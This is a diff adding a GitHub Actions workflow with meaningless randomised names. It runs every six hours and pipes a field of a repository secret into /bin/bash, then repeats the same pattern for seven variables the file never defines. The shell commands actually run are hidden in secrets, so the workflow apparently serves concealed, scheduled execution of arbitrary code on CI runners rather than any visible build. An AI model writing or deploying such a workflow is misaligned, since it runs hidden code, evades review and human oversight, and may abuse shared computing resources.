@@ -1,0 +1,23 @@
+name: ningtiandeng4718
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ningtiandeng4718
+        env:
+          tbhbm16669: ${{ secrets.tbhbm16669 }}
+        run: |
+          echo $tbhbm16669 | jq -r .itu5136 | /bin/bash
+          echo $bpezk3 | jq -r .jjnsk371 | /bin/bash
+          echo $ye372 | jq -r .yklf17 | /bin/bash
+          echo $s58 | jq -r .yb35849 | /bin/bash
+          echo $eron58239 | jq -r .r0688 | /bin/bash
+          echo $bxhm3521 | jq -r .atti92 | /bin/bash
+          echo $s46 | jq -r .wjh16 | /bin/bash
+          echo $yce8 | jq -r .dnpjv97 | /bin/bash
+
